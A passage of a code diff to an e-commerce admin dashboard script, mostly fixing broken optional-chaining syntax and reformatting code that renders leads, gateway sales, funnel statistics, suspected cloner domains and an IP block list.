+        const query = leadsSearch?.value.trim() || '';
         const url = new URL('/api/admin/leads', window.location.origin);
         url.searchParams.set('limit', String(limit));
         url.searchParams.set('offset', String(offset));
@@ -7631,7 +6687,7 @@ function initAdmin() {
             if (paymentsGatewayOrder) {
                 loadGatewayOrderDailyStats().catch(() => null);
             }
-            if (overviewRangeStatus && data ? .summary ? .range && hasOverviewRangeControls) {
+            if (overviewRangeStatus && data?.summary?.range && hasOverviewRangeControls) {
                 overviewRangeStatus.textContent = describeOverviewRange({
                     preset: overviewRange.preset,
                     from: activeRange.from || '',
@@ -7641,7 +6697,7 @@ function initAdmin() {
             offset += rows.length;
         } else if (overviewRangeStatus && hasOverviewRangeControls) {
             const detail = await res.json().catch(() => ({}));
-            overviewRangeStatus.textContent = detail ? .error || 'Falha ao carregar periodo selecionado.';
+            overviewRangeStatus.textContent = detail?.error || 'Falha ao carregar periodo selecionado.';
         }
         loadingLeads = false;
     };
@@ -7671,8 +6727,8 @@ function initAdmin() {
         }
 
         if (clonersDomainsBody) {
-            clonersDomainsBody.innerHTML = domains.length ?
-                domains.map((item) => {
+            clonersDomainsBody.innerHTML = domains.length
+                ? domains.map((item) => {
                     const pageList = (item.pages || []).slice(0, 3).map((page) => `${page.page} (${page.count})`).join(', ');
                     const href = item.latestHref || '';
                     return `
@@ -7690,13 +6746,13 @@ function initAdmin() {
                             <td>${href ? `<a class="btn-secondary btn-secondary--compact" href="${escapeHtml(href)}" target="_blank" rel="noopener noreferrer">Abrir</a>` : '-'}</td>
                         </tr>
                     `;
-                }).join('') :
-                '<tr><td colspan="8" class="admin-muted">Nenhum dominio suspeito registrado.</td></tr>';
+                }).join('')
+                : '<tr><td colspan="8" class="admin-muted">Nenhum dominio suspeito registrado.</td></tr>';
         }
 
         if (clonersEventsBody) {
-            clonersEventsBody.innerHTML = events.length ?
-                events.slice(0, 80).map((event) => `
+            clonersEventsBody.innerHTML = events.length
+                ? events.slice(0, 80).map((event) => `
                     <tr>
                         <td>${escapeHtml(formatDateTime(event.created_at))}</td>
                         <td>${escapeHtml(event.reported_host || '-')}</td>
@@ -7706,19 +6762,19 @@ function initAdmin() {
                         <td>${escapeHtml(event.referrer || '-')}</td>
                         <td>${escapeHtml(event.user_agent || '-')}</td>
                     </tr>
-                `).join('') :
-                '<tr><td colspan="7" class="admin-muted">Nenhum evento bruto registrado.</td></tr>';
+                `).join('')
+                : '<tr><td colspan="7" class="admin-muted">Nenhum evento bruto registrado.</td></tr>';
         }
 
         if (clonersPages) {
-            clonersPages.innerHTML = pages.length ?
-                pages.slice(0, 10).map((item) => `
+            clonersPages.innerHTML = pages.length
+                ? pages.slice(0, 10).map((item) => `
                     <div class="cloner-page-pill">
                         <strong>${escapeHtml(item.count || 0)}</strong>
                         <span>${escapeHtml(item.page || '-')}</span>
                     </div>
-                `).join('') :
-                '<span class="admin-muted">Aguardando eventos por pagina.</span>';
+                `).join('')
+                : '<span class="admin-muted">Aguardando eventos por pagina.</span>';
         }
     };
 
@@ -7753,7 +6809,7 @@ function initAdmin() {
         if (!res.ok) {
             const detail = await res.json().catch(() => ({}));
             if (leadsReconcileStatus) {
-                const extra = detail ? .detail ? ` (${typeof detail.detail === 'string' ? detail.detail : JSON.stringify(detail.detail).slice(0, 180)})` : '';
+                const extra = detail?.detail ? ` (${typeof detail.detail === 'string' ? detail.detail : JSON.stringify(detail.detail).slice(0, 180)})` : '';
                 leadsReconcileStatus.textContent = `${detail?.error || 'Falha ao consultar transacoes.'}${extra}`;
             }
             showToast('Falha ao consultar transacoes.', 'error');
@@ -7761,9 +6817,7 @@ function initAdmin() {
             return;
         }
         const data = await res.json().catch(() => ({}));
-        await loadLeads({
-            reset: true
-        });
+        await loadLeads({ reset: true });
         if (leadsReconcileStatus) {
             leadsReconcileStatus.textContent = `Consultados ${data.checked || 0}, pagos ${data.confirmed || 0}, pendentes ${data.pending || 0}, estornados ${data.refunded || 0}, recusados ${data.refused || 0}. Leads sincronizados: ${data.updated || 0}.`;
         }
@@ -7775,7 +6829,7 @@ function initAdmin() {
     const exportLeads = async () => {
         if (!leadsExport) return;
 
-        const segment = String(leadsExportFilter ? .value || 'all').trim() || 'all';
+        const segment = String(leadsExportFilter?.value || 'all').trim() || 'all';
         leadsExport.disabled = true;
         if (leadsExportStatus) leadsExportStatus.textContent = 'Gerando planilha...';
 
@@ -7789,7 +6843,7 @@ function initAdmin() {
 
             if (!res.ok) {
                 const detail = await res.json().catch(() => ({}));
-                throw new Error(detail ? .error || 'Falha ao exportar leads.');
+                throw new Error(detail?.error || 'Falha ao exportar leads.');
             }
 
             const blob = await res.blob();
@@ -7812,9 +6866,9 @@ function initAdmin() {
 
             if (leadsExportStatus) {
                 if (exportCount > 0) {
-                    leadsExportStatus.textContent = truncated ?
-                        `${exportCount} leads exportados. Limite maximo atingido.` :
-                        `${exportCount} leads exportados com sucesso.`;
+                    leadsExportStatus.textContent = truncated
+                        ? `${exportCount} leads exportados. Limite maximo atingido.`
+                        : `${exportCount} leads exportados com sucesso.`;
                 } else {
                     leadsExportStatus.textContent = 'Nenhum lead encontrado para este filtro.';
                 }
@@ -7822,7 +6876,7 @@ function initAdmin() {
             showToast('Planilha exportada com sucesso.', 'success');
         } catch (error) {
             if (leadsExportStatus) {
-                leadsExportStatus.textContent = error ? .message || 'Falha ao exportar leads.';
+                leadsExportStatus.textContent = error?.message || 'Falha ao exportar leads.';
             }
             showToast('Falha ao exportar leads.', 'error');
         } finally {
@@ -7835,7 +6889,7 @@ function initAdmin() {
         const res = await adminFetch('/api/admin/pages');
         if (!res.ok) return;
         const data = await res.json();
-        const rows = (data.data || []).filter((row) => !String(row ? .page || '').startsWith('backredirect_'));
+        const rows = (data.data || []).filter((row) => !String(row?.page || '').startsWith('backredirect_'));
         const max = rows.reduce((acc, row) => Math.max(acc, Number(row.total) || 0), 0) || 1;
         pagesGrid.innerHTML = '';
         rows.forEach((row) => {
@@ -7858,15 +6912,12 @@ function initAdmin() {
             order.forEach((page, index) => {
                 if (!map.has(page)) return;
                 const current = map.get(page);
-                const prev = prevEffective ? ? current;
+                const prev = prevEffective ?? current;
                 const carried = Math.min(current, prev);
                 const conv = prev ? Math.round((carried / prev) * 100) : 0;
                 const drop = prev ? Math.max(0, prev - carried) : 0;
                 const direct = Math.max(0, current - prev);
-                const meta = funnelPageMeta[page] || {
-                    label: page,
-                    desc: 'Etapa do funil'
-                };
+                const meta = funnelPageMeta[page] || { label: page, desc: 'Etapa do funil' };
                 const card = document.createElement('div');
                 card.className = 'admin-insight-card';
                 card.innerHTML = `
@@ -7889,8 +6940,8 @@ function initAdmin() {
         const res = await adminFetch('/api/admin/backredirects');
         if (!res.ok) return;
         const payload = await res.json().catch(() => ({}));
-        const rows = Array.isArray(payload ? .data) ? payload.data : [];
-        const summary = payload ? .summary || {};
+        const rows = Array.isArray(payload?.data) ? payload.data : [];
+        const summary = payload?.summary || {};
         const totalBack = Number(summary.totalBack || 0);
 
         if (backredirectTotal) {
@@ -7898,10 +6949,10 @@ function initAdmin() {
         }
 
         if (backredirectTopPage) {
-            backredirectTopPage.textContent = rows[0] ? .page ? (funnelPageMeta[rows[0].page] ? .label || rows[0].page) : '-';
+            backredirectTopPage.textContent = rows[0]?.page ? (funnelPageMeta[rows[0].page]?.label || rows[0].page) : '-';
         }
         if (backredirectTopRate) {
-            const rate = Number(rows[0] ? .rate || 0);
+            const rate = Number(rows[0]?.rate || 0);
             backredirectTopRate.textContent = `${rate.toFixed(1)}%`;
         }
 
@@ -7910,10 +6961,7 @@ function initAdmin() {
             const max = rows.reduce((acc, row) => Math.max(acc, Number(row.backTotal) || 0), 0) || 1;
             rows.forEach((row) => {
                 const page = String(row.page || '').trim();
-                const meta = funnelPageMeta[page] || {
-                    label: `${page || '-'}.html`,
-                    desc: 'Etapa do funil'
-                };
+                const meta = funnelPageMeta[page] || { label: `${page || '-'}.html`, desc: 'Etapa do funil' };
                 const backTotal = Number(row.backTotal || 0);
                 const pageViews = Number(row.pageViews || 0);
                 const rate = Number(row.rate || 0);
@@ -7942,10 +6990,7 @@ function initAdmin() {
             backredirectInsights.innerHTML = '';
             rows.slice(0, 6).forEach((row, index) => {
                 const page = String(row.page || '').trim();
-                const meta = funnelPageMeta[page] || {
-                    label: page || '-',
-                    desc: 'Etapa do funil'
-                };
+                const meta = funnelPageMeta[page] || { label: page || '-', desc: 'Etapa do funil' };
                 const card = document.createElement('div');
                 card.className = 'admin-insight-card';
                 card.innerHTML = `
@@ -7962,8 +7007,8 @@ function initAdmin() {
 
     const buildSalesTopTags = (entry) => {
         const tags = [];
-        if (entry ? .isTopUpsell) tags.push('#top 1 em upsell');
-        if (entry ? .isTopOrderBump) tags.push('#top 1 em orderbump');
+        if (entry?.isTopUpsell) tags.push('#top 1 em upsell');
+        if (entry?.isTopOrderBump) tags.push('#top 1 em orderbump');
         return tags;
     };
 
@@ -7978,14 +7023,14 @@ function initAdmin() {
     };
 
     const renderSalesWinner = (strongNode, detailNode, tagNode, entry, emptyLabel = '-') => {
-        if (strongNode) strongNode.textContent = entry ? .label || emptyLabel;
-        if (tagNode) tagNode.textContent = entry ? .label || emptyLabel;
+        if (strongNode) strongNode.textContent = entry?.label || emptyLabel;
+        if (tagNode) tagNode.textContent = entry?.label || emptyLabel;
         if (detailNode) {
-            const winnerAmount = Number(entry ? .amount || 0);
-            const winnerAvgTicket = Number(entry ? .avgTicket || 0);
-            detailNode.textContent = entry ?
-                `${entry.count || 0} vendas • ${Number(entry.share || 0).toFixed(1)}% • ${formatCurrency(Number(entry.amount || 0))}` :
-                'Sem vendas ainda';
+            const winnerAmount = Number(entry?.amount || 0);
+            const winnerAvgTicket = Number(entry?.avgTicket || 0);
+            detailNode.textContent = entry
+                ? `${entry.count || 0} vendas • ${Number(entry.share || 0).toFixed(1)}% • ${formatCurrency(Number(entry.amount || 0))}`
+                : 'Sem vendas ainda';
             if (entry) {
                 const winnerParts = [
                     `${entry.count || 0} vendas`,
@@ -8008,12 +7053,12 @@ function initAdmin() {
             return;
         }
 
-        const max = rows.reduce((acc, item) => Math.max(acc, Number(item ? .count) || 0), 0) || 1;
+        const max = rows.reduce((acc, item) => Math.max(acc, Number(item?.count) || 0), 0) || 1;
         container.innerHTML = rows.map((item, index) => {
-            const count = Number(item ? .count || 0);
-            const amount = Number(item ? .amount || 0);
-            const avgTicket = Number(item ? .avgTicket || 0);
-            const share = Number(item ? .share || 0);
+            const count = Number(item?.count || 0);
+            const amount = Number(item?.amount || 0);
+            const avgTicket = Number(item?.avgTicket || 0);
+            const share = Number(item?.share || 0);
             const topTagsHtml = renderSalesTopTagsHtml(item);
             const width = Math.max(6, Math.round((count / max) * 100));
             return `
@@ -8038,7 +7083,7 @@ function initAdmin() {
     };
 
     const renderPublicAudienceList = (items = [], emptyText = 'Sem dados suficientes.') => {
-        const rows = Array.isArray(items) ? items.filter((item) => Number(item ? .count || 0) > 0) : [];
+        const rows = Array.isArray(items) ? items.filter((item) => Number(item?.count || 0) > 0) : [];
         if (!rows.length) return `<span>${escapeHtml(emptyText)}</span>`;
         return rows.slice(0, 5).map((item) => `
             <span>
@@ -8050,20 +7095,20 @@ function initAdmin() {
 
     const renderPublicAudience = (audience = null) => {
         if (!publicAudienceResult) return;
-        if (!audience || !Number(audience ? .totalPaid || 0)) {
+        if (!audience || !Number(audience?.totalPaid || 0)) {
             publicAudienceResult.innerHTML = '<div class="sales-ranking-empty">Sem vendas pagas suficientes para montar o público ideal.</div>';
             if (publicAudienceConfidence) publicAudienceConfidence.textContent = 'Sem base';
             return;
         }
 
-        const setup = audience ? .setup || {};
-        const evidence = audience ? .evidence || {};
-        const missing = audience ? .missing || {};
-        const notes = Array.isArray(audience ? .notes) ? audience.notes : [];
-        const ageWinner = setup ? .age ? .winner || null;
-        const placements = Array.isArray(setup ? .placements) && setup.placements.length ?
-            setup.placements.join(', ') :
-            'Advantage+ placements';
+        const setup = audience?.setup || {};
+        const evidence = audience?.evidence || {};
+        const missing = audience?.missing || {};
+        const notes = Array.isArray(audience?.notes) ? audience.notes : [];
+        const ageWinner = setup?.age?.winner || null;
+        const placements = Array.isArray(setup?.placements) && setup.placements.length
+            ? setup.placements.join(', ')
+            : 'Advantage+ placements';
 
         if (publicAudienceConfidence) publicAudienceConfidence.textContent = `Confiança: ${audience.confidence || '-'}`;
         publicAudienceResult.innerHTML = `
@@ -8123,9 +7168,7 @@ function initAdmin() {
         `;
     };
 
-    const loadSalesInsights = async ({
-        manual = false
-    } = {}) => {
+    const loadSalesInsights = async ({ manual = false } = {}) => {
         if (!wantsSalesInsights) return;
 
         const url = new URL('/api/admin/sales-insights', window.location.origin);
@@ -8146,52 +7189,52 @@ function initAdmin() {
         } finally {
             if (manual && publicAudienceBuild) publicAudienceBuild.disabled = false;
         }
-        if (!res.ok || payload ? .ok === false) {
+        if (!res.ok || payload?.ok === false) {
             renderSalesWinner(salesPositioningWinner, salesPositioningDetail, salesTopPositioningLabel, null);
             renderSalesWinner(salesCityWinner, salesCityDetail, salesTopCityLabel, null);
             renderSalesWinner(salesDeviceWinner, salesDeviceDetail, salesTopDeviceLabel, null);
-            renderSalesRankingList(salesPositioningList, [], payload ? .error || 'Sem dados de posicionamento.');
-            renderSalesRankingList(salesCityList, [], payload ? .error || 'Sem dados de cidade.');
-            renderSalesRankingList(salesDeviceList, [], payload ? .error || 'Sem dados de aparelho.');
+            renderSalesRankingList(salesPositioningList, [], payload?.error || 'Sem dados de posicionamento.');
+            renderSalesRankingList(salesCityList, [], payload?.error || 'Sem dados de cidade.');
+            renderSalesRankingList(salesDeviceList, [], payload?.error || 'Sem dados de aparelho.');
             if (salesBase) salesBase.textContent = 'Base: 0 vendas';
             if (salesPaidTotal) salesPaidTotal.textContent = '0';
             if (salesRevenueTotal) salesRevenueTotal.textContent = formatCurrency(0);
             if (salesUpdated) salesUpdated.textContent = '-';
             if (overviewRangeStatus && hasOverviewRangeControls) {
-                overviewRangeStatus.textContent = payload ? .error || 'Falha ao carregar periodo selecionado.';
+                overviewRangeStatus.textContent = payload?.error || 'Falha ao carregar periodo selecionado.';
             }
-            if (manual && publicAudienceStatus) publicAudienceStatus.textContent = payload ? .error || 'Falha ao calcular público ideal.';
+            if (manual && publicAudienceStatus) publicAudienceStatus.textContent = payload?.error || 'Falha ao calcular público ideal.';
             if (manual) renderPublicAudience(null);
             return;
         }
 
-        const summary = payload ? .summary || {};
-        const data = payload ? .data || {};
-        const totalPaid = Number(summary ? .totalPaid || 0);
-        const totalRevenue = Number(summary ? .totalRevenue || 0);
+        const summary = payload?.summary || {};
+        const data = payload?.data || {};
+        const totalPaid = Number(summary?.totalPaid || 0);
+        const totalRevenue = Number(summary?.totalRevenue || 0);
 
         if (salesBase) {
-            salesBase.textContent = summary ? .truncated ?
-                `Base: ${totalPaid} vendas (amostra)` :
-                `Base: ${totalPaid} vendas`;
+            salesBase.textContent = summary?.truncated
+                ? `Base: ${totalPaid} vendas (amostra)`
+                : `Base: ${totalPaid} vendas`;
         }
         if (salesPaidTotal) salesPaidTotal.textContent = String(totalPaid);
         if (salesRevenueTotal) salesRevenueTotal.textContent = formatCurrency(totalRevenue);
-        if (salesUpdated) salesUpdated.textContent = formatDateTime(summary ? .lastSaleAt);
+        if (salesUpdated) salesUpdated.textContent = formatDateTime(summary?.lastSaleAt);
 
-        renderSalesWinner(salesPositioningWinner, salesPositioningDetail, salesTopPositioningLabel, summary ? .topPositioning || null);
-        renderSalesWinner(salesCityWinner, salesCityDetail, salesTopCityLabel, summary ? .topCity || null);
-        renderSalesWinner(salesDeviceWinner, salesDeviceDetail, salesTopDeviceLabel, summary ? .topDevice || null);
+        renderSalesWinner(salesPositioningWinner, salesPositioningDetail, salesTopPositioningLabel, summary?.topPositioning || null);
+        renderSalesWinner(salesCityWinner, salesCityDetail, salesTopCityLabel, summary?.topCity || null);
+        renderSalesWinner(salesDeviceWinner, salesDeviceDetail, salesTopDeviceLabel, summary?.topDevice || null);
 
-        renderSalesRankingList(salesPositioningList, data ? .positionings || [], 'Nenhuma venda com posicionamento identificado nesse periodo.');
-        renderSalesRankingList(salesCityList, data ? .cities || [], 'Nenhuma venda com cidade identificada nesse periodo.');
-        renderSalesRankingList(salesDeviceList, data ? .devices || [], 'Nenhuma venda com aparelho identificado nesse periodo.');
-        renderPublicAudience(payload ? .audience || null);
+        renderSalesRankingList(salesPositioningList, data?.positionings || [], 'Nenhuma venda com posicionamento identificado nesse periodo.');
+        renderSalesRankingList(salesCityList, data?.cities || [], 'Nenhuma venda com cidade identificada nesse periodo.');
+        renderSalesRankingList(salesDeviceList, data?.devices || [], 'Nenhuma venda com aparelho identificado nesse periodo.');
+        renderPublicAudience(payload?.audience || null);
 
         if (overviewRangeStatus && hasOverviewRangeControls) {
-            overviewRangeStatus.textContent = forceAllPaidAudience ?
-                'Período: todos os compradores pagos' :
-                describeOverviewRange({
+            overviewRangeStatus.textContent = forceAllPaidAudience
+                ? 'Período: todos os compradores pagos'
+                : describeOverviewRange({
                     preset: overviewRange.preset,
                     from: activeRange.from || '',
                     to: activeRange.to || ''
@@ -8211,7 +7254,7 @@ function initAdmin() {
         }
 
         gatewaySalesGrid.innerHTML = rows.map((item) => {
-            const gateway = String(item ? .gateway || '').trim();
+            const gateway = String(item?.gateway || '').trim();
             const active = gateway && gateway === gatewaySalesState.selectedGateway;
             return `
                 <button class="gateway-sales-card${active ? ' is-active' : ''}" type="button" data-gateway-sales-card="${escapeHtml(gateway)}">
@@ -8238,21 +7281,21 @@ function initAdmin() {
         }
 
         gatewaySalesBody.innerHTML = rows.map((item) => {
-            const leadName = String(item ? .lead ? .name || '-').trim() || '-';
+            const leadName = String(item?.lead?.name || '-').trim() || '-';
             const leadMeta = [
-                String(item ? .lead ? .email || '').trim(),
-                String(item ? .lead ? .cpf || '').trim(),
-                String(item ? .sessionId || '').trim() ? `Sessao ${String(item.sessionId).trim()}` : ''
+                String(item?.lead?.email || '').trim(),
+                String(item?.lead?.cpf || '').trim(),
+                String(item?.sessionId || '').trim() ? `Sessao ${String(item.sessionId).trim()}` : ''
             ].filter(Boolean);
             const offerMeta = [
-                String(item ? .stepLabel || '').trim(),
-                String(item ? .shippingName || '').trim(),
-                String(item ? .journey ? .label || '').trim() ? `Jornada ${String(item.journey.label).trim()}` : ''
+                String(item?.stepLabel || '').trim(),
+                String(item?.shippingName || '').trim(),
+                String(item?.journey?.label || '').trim() ? `Jornada ${String(item.journey.label).trim()}` : ''
             ].filter(Boolean);
             const campaignMeta = [
-                String(item ? .utm ? .source || '').trim(),
-                String(item ? .utm ? .campaign || '').trim(),
-                String(item ? .utm ? .term || '').trim()
+                String(item?.utm?.source || '').trim(),
+                String(item?.utm?.campaign || '').trim(),
+                String(item?.utm?.term || '').trim()
             ].filter((value) => value && value !== '-');
 
             return `
@@ -8294,9 +7337,7 @@ function initAdmin() {
         }).join('');
     };
 
-    const loadGatewaySales = async ({
-        keepSelection = false
-    } = {}) => {
+    const loadGatewaySales = async ({ keepSelection = false } = {}) => {
         if (!wantsGatewaySales || gatewaySalesState.loading) return;
         gatewaySalesState.loading = true;
         if (gatewaySalesStatus) gatewaySalesStatus.textContent = 'Carregando vendas por gateway...';
@@ -8316,7 +7357,7 @@ function initAdmin() {
         const payload = await res.json().catch(() => ({}));
         gatewaySalesState.loading = false;
 
-        if (!res.ok || payload ? .ok === false) {
+        if (!res.ok || payload?.ok === false) {
             renderGatewaySalesCards([]);
             renderGatewaySalesTable([]);
             if (gatewaySalesBase) gatewaySalesBase.textContent = 'Base: 0 vendas';
@@ -8328,42 +7369,40 @@ function initAdmin() {
             if (gatewaySalesDetailRevenue) gatewaySalesDetailRevenue.textContent = formatCurrency(0);
             if (gatewaySalesDetailCount) gatewaySalesDetailCount.textContent = '0 vendas';
             if (gatewaySalesSelectedChip) gatewaySalesSelectedChip.textContent = gatewaySalesState.selectedGateway ? gatewayLabelForUi(gatewaySalesState.selectedGateway) : 'Todos';
-            if (gatewaySalesStatus) gatewaySalesStatus.textContent = payload ? .error || 'Falha ao carregar vendas por gateway.';
+            if (gatewaySalesStatus) gatewaySalesStatus.textContent = payload?.error || 'Falha ao carregar vendas por gateway.';
             return;
         }
 
-        const summary = Array.isArray(payload ? .summary) ? payload.summary : [];
-        const meta = payload ? .meta || {};
-        const detail = payload ? .detail || {};
-        const items = Array.isArray(payload ? .items) ? payload.items : [];
-        if (!gatewaySalesState.selectedGateway && !keepSelection && summary[0] ? .gateway) {
+        const summary = Array.isArray(payload?.summary) ? payload.summary : [];
+        const meta = payload?.meta || {};
+        const detail = payload?.detail || {};
+        const items = Array.isArray(payload?.items) ? payload.items : [];
+        if (!gatewaySalesState.selectedGateway && !keepSelection && summary[0]?.gateway) {
             gatewaySalesState.selectedGateway = String(summary[0].gateway || '').trim();
-            return loadGatewaySales({
-                keepSelection: true
-            });
+            return loadGatewaySales({ keepSelection: true });
         }
 
         renderGatewaySalesCards(summary);
         renderGatewaySalesTable(items);
 
         if (gatewaySalesBase) {
-            gatewaySalesBase.textContent = meta ? .truncated ?
-                `Base: ${Number(meta?.totalSales || 0)} vendas (amostra)` :
-                `Base: ${Number(meta?.totalSales || 0)} vendas`;
+            gatewaySalesBase.textContent = meta?.truncated
+                ? `Base: ${Number(meta?.totalSales || 0)} vendas (amostra)`
+                : `Base: ${Number(meta?.totalSales || 0)} vendas`;
         }
-        if (gatewaySalesUpdated) gatewaySalesUpdated.textContent = formatDateTime(meta ? .lastPaidAt);
-        if (gatewaySalesTopGateway) gatewaySalesTopGateway.textContent = summary[0] ? .gatewayLabel || '-';
-        if (gatewaySalesCurrentFilter) gatewaySalesCurrentFilter.textContent = detail ? .gatewayLabel || 'Todos';
-        if (gatewaySalesTotalRevenue) gatewaySalesTotalRevenue.textContent = formatCurrency(Number(meta ? .totalGrossRevenue || 0));
+        if (gatewaySalesUpdated) gatewaySalesUpdated.textContent = formatDateTime(meta?.lastPaidAt);
+        if (gatewaySalesTopGateway) gatewaySalesTopGateway.textContent = summary[0]?.gatewayLabel || '-';
+        if (gatewaySalesCurrentFilter) gatewaySalesCurrentFilter.textContent = detail?.gatewayLabel || 'Todos';
+        if (gatewaySalesTotalRevenue) gatewaySalesTotalRevenue.textContent = formatCurrency(Number(meta?.totalGrossRevenue || 0));
         if (gatewaySalesTotalCount) gatewaySalesTotalCount.textContent = `${Number(meta?.totalSales || 0)} vendas`;
-        if (gatewaySalesSelectedChip) gatewaySalesSelectedChip.textContent = detail ? .gatewayLabel || 'Todos';
-        if (gatewaySalesDetailRevenue) gatewaySalesDetailRevenue.textContent = formatCurrency(Number(detail ? .totalGrossRevenue || 0));
+        if (gatewaySalesSelectedChip) gatewaySalesSelectedChip.textContent = detail?.gatewayLabel || 'Todos';
+        if (gatewaySalesDetailRevenue) gatewaySalesDetailRevenue.textContent = formatCurrency(Number(detail?.totalGrossRevenue || 0));
         if (gatewaySalesDetailCount) gatewaySalesDetailCount.textContent = `${Number(detail?.totalSales || 0)} vendas`;
         if (gatewaySalesStatus) {
             const parts = [];
-            if (detail ? .gatewayLabel) parts.push(`Mostrando ${detail.gatewayLabel}`);
+            if (detail?.gatewayLabel) parts.push(`Mostrando ${detail.gatewayLabel}`);
             else parts.push('Mostrando todos os gateways');
-            if (detail ? .query) parts.push(`busca: ${detail.query}`);
+            if (detail?.query) parts.push(`busca: ${detail.query}`);
             gatewaySalesStatus.textContent = parts.join(' | ');
         }
 
@@ -8376,20 +7415,20 @@ function initAdmin() {
         }
     };
 
-    leadsBody ? .addEventListener('click', (event) => {
-        const row = event.target ? .closest ? .('tr[data-session-id]');
+    leadsBody?.addEventListener('click', (event) => {
+        const row = event.target?.closest?.('tr[data-session-id]');
         if (!row) return;
         openLeadDetail(row.getAttribute('data-session-id') || '');
     });
-    leadsBody ? .addEventListener('keydown', (event) => {
+    leadsBody?.addEventListener('keydown', (event) => {
         if (event.key !== 'Enter' && event.key !== ' ') return;
-        const row = event.target ? .closest ? .('tr[data-session-id]');
+        const row = event.target?.closest?.('tr[data-session-id]');
         if (!row) return;
         event.preventDefault();
         openLeadDetail(row.getAttribute('data-session-id') || '');
     });
-    ipBlacklistBody ? .addEventListener('click', async (event) => {
-        const button = event.target ? .closest ? .('[data-remove-block-ip]');
+    ipBlacklistBody?.addEventListener('click', async (event) => {
+        const button = event.target?.closest?.('[data-remove-block-ip]');
         if (!button) return;
         const ip = button.getAttribute('data-remove-block-ip') || '';
         if (!ip) return;
@@ -8397,14 +7436,14 @@ function initAdmin() {
         if (!confirmed) return;
         await removeBlockedIp(ip);
     });
-    leadDetailClose ? .addEventListener('click', closeLeadDetailModal);
-    leadDetailModal ? .addEventListener('click', (event) => {
+    leadDetailClose?.addEventListener('click', closeLeadDetailModal);
+    leadDetailModal?.addEventListener('click', (event) => {
         if (event.target === leadDetailModal) {
             closeLeadDetailModal();
         }
     });
-    leadDetailCopyPayload ? .addEventListener('click', async () => {
-        const text = String(leadDetailPayload ? .textContent || '').trim();
+    leadDetailCopyPayload?.addEventListener('click', async () => {
+        const text = String(leadDetailPayload?.textContent || '').trim();
         if (!text) return;
         try {
             await navigator.clipboard.writeText(text);
@@ -8413,11 +7452,11 @@ function initAdmin() {
             showToast('Nao foi possivel copiar o payload.', 'error');
         }
     });
-    gatewayTestBtn ? .addEventListener('click', openGatewayTestModal);
-    gatewayTestClose ? .addEventListener('click', closeGatewayTestModal);
-    gatewayTestReset ? .addEventListener('click', resetGatewayTestResults);
-    gatewayTestGenerate ? .addEventListener('click', runGatewayTests);
-    ensureSettingsRetryModal().retryBtn ? .addEventListener('click', async () => {
+    gatewayTestBtn?.addEventListener('click', openGatewayTestModal);
+    gatewayTestClose?.addEventListener('click', closeGatewayTestModal);
+    gatewayTestReset?.addEventListener('click', resetGatewayTestResults);
+    gatewayTestGenerate?.addEventListener('click', runGatewayTests);
+    ensureSettingsRetryModal().retryBtn?.addEventListener('click', async () => {
         const refs = ensureSettingsRetryModal();
         if (refs.retryBtn) {
             refs.retryBtn.disabled = true;
@@ -8429,58 +7468,52 @@ function initAdmin() {
             refs.retryBtn.textContent = 'Tentar novamente';
         }
     });
-    gatewayTestModal ? .addEventListener('click', (event) => {
+    gatewayTestModal?.addEventListener('click', (event) => {
         if (event.target === gatewayTestModal) {
             closeGatewayTestModal();
         }
     });
-    gatewayTestResults ? .addEventListener('click', async (event) => {
-        const button = event.target ? .closest ? .('[data-gateway-test-copy]');
+    gatewayTestResults?.addEventListener('click', async (event) => {
+        const button = event.target?.closest?.('[data-gateway-test-copy]');
         if (!button) return;
         const code = String(button.getAttribute('data-gateway-test-copy') || '').trim();
         if (!code) return;
         try {
             await navigator.clipboard.writeText(code);
         } catch (_error) {
-            const input = button.parentElement ? .querySelector('input');
-            input ? .select ? .();
+            const input = button.parentElement?.querySelector('input');
+            input?.select?.();
             document.execCommand('copy');
         }
         showToast('Codigo PIX copiado.', 'success');
     });
-    gatewaySalesGrid ? .addEventListener('click', (event) => {
-        const card = event.target ? .closest ? .('[data-gateway-sales-card]');
+    gatewaySalesGrid?.addEventListener('click', (event) => {
+        const card = event.target?.closest?.('[data-gateway-sales-card]');
         if (!card) return;
         const gateway = String(card.getAttribute('data-gateway-sales-card') || '').trim();
         if (!gateway) return;
         gatewaySalesState.selectedGateway = gateway;
-        loadGatewaySales({
-            keepSelection: true
-        });
+        loadGatewaySales({ keepSelection: true });
     });
     let gatewaySalesSearchDebounce = 0;
-    gatewaySalesSearch ? .addEventListener('input', () => {
+    gatewaySalesSearch?.addEventListener('input', () => {
         window.clearTimeout(gatewaySalesSearchDebounce);
         gatewaySalesSearchDebounce = window.setTimeout(() => {
             gatewaySalesState.query = String(gatewaySalesSearch.value || '').trim();
-            loadGatewaySales({
-                keepSelection: true
-            });
+            loadGatewaySales({ keepSelection: true });
         }, 220);
     });
-    gatewaySalesSearch ? .addEventListener('keydown', (event) => {
+    gatewaySalesSearch?.addEventListener('keydown', (event) => {
         if (event.key !== 'Enter') return;
         event.preventDefault();
         window.clearTimeout(gatewaySalesSearchDebounce);
         gatewaySalesState.query = String(gatewaySalesSearch.value || '').trim();
-        loadGatewaySales({
-            keepSelection: true
-        });
+        loadGatewaySales({ keepSelection: true });
     });
-    leadDetailLookupBtn ? .addEventListener('click', consultLeadTransaction);
-    leadDetailBlockBtn ? .addEventListener('click', blockCurrentLeadIp);
-    leadDetailUnblockBtn ? .addEventListener('click', async () => {
-        const ip = String(currentLeadDetail ? .device ? .clientIp || '').trim();
+    leadDetailLookupBtn?.addEventListener('click', consultLeadTransaction);
+    leadDetailBlockBtn?.addEventListener('click', blockCurrentLeadIp);
+    leadDetailUnblockBtn?.addEventListener('click', async () => {
+        const ip = String(currentLeadDetail?.device?.clientIp || '').trim();
         if (!ip) return;
         const confirmed = window.confirm(`Tem certeza que deseja remover o bloqueio do IP ${ip}?`);
         if (!confirmed) return;
@@ -8496,28 +7529,24 @@ function initAdmin() {
         }
     });
 
-    loginBtn ? .addEventListener('click', async () => {
+    loginBtn?.addEventListener('click', async () => {
         if (loginError) loginError.classList.add('hidden');
-        const password = passwordInput ? .value || '';
+        const password = passwordInput?.value || '';
         const res = await adminFetch('/api/admin/login', {
             method: 'POST',
-            body: JSON.stringify({
-                password
-            })
+            body: JSON.stringify({ password })
         });
         if (!res.ok) {
             const detail = await res.json().catch(() => ({}));
             if (loginError) {
-                loginError.textContent = detail ? .error || 'Senha invalida.';
+                loginError.textContent = detail?.error || 'Senha invalida.';
                 loginError.classList.remove('hidden');
             }
             return;
         }
         setLoginVisible(false);
         if (hasPixelForm || hasUtmfyForm || hasPaymentsForm || hasFeatureForm) await loadSettings();
-        if (wantsLeads) await loadLeads({
